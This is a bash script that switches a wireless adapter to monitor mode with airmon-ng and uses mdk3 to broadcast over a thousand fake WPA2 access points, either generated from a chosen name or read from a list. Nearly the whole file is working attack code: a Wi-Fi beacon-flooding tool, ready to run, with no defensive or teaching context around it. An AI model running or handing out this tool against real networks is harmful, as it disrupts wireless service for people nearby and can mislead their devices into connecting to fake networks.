#!/bin/bash

if [[ $EUID -ne 0 ]];then
  echo Run it as root!
  exit
fi

cat /proc/net/dev | grep $1 > /dev/null 2>&1
if [ $? -ne 0 ];then
  echo Selected adapter does not exists!
  exit
fi

if [ -f $2 ];then
  genList=0
else
  genList=1
fi

# Trap for Ctrl + C
trap ctrl_c INT
function ctrl_c(){
  # Stops monitor mode and renables wifi
  systemctl restart NetworkManager > /dev/null 2>&1
  airmon-ng stop $1mon > /dev/null 2>&1
  ifconfig $1 up > /dev/null 2>&1
  rm aps.txt
}

command -v systemctl >/dev/null 2>&1 || { echo >&2 "Systemctl is not installed. Aborting."; exit 1; }
command -v airmon-ng >/dev/null 2>&1 || { echo >&2 "Airmon-ng is not installed.  Aborting."; exit 1; }
command -v mdk3 >/dev/null 2>&1 || { echo >&2 "Mdk3 is not installed.  Aborting."; exit 1; }

if [ $genList -eq 1 ];then
  # Generates 1000 aps with selected name
  i=0
  until [ $i -gt 1000 ]
  do
    # The '$i' can be removed
    echo "$2 $i" >> aps.txt
    ((i++))
  done
fi

# Starts monitor mode
sudo airmon-ng check kill > /dev/null 2>&1
sudo airmon-ng start $1 > /dev/null 2>&1

# Starts generating aps
if [ $genList -eq 1 ];then
  sudo mdk3 $1mon b -a -f aps.txt
else
  sudo mdk3 $1mon b -a -f $2
fi
# Parameters: -a (WPA2 AP)
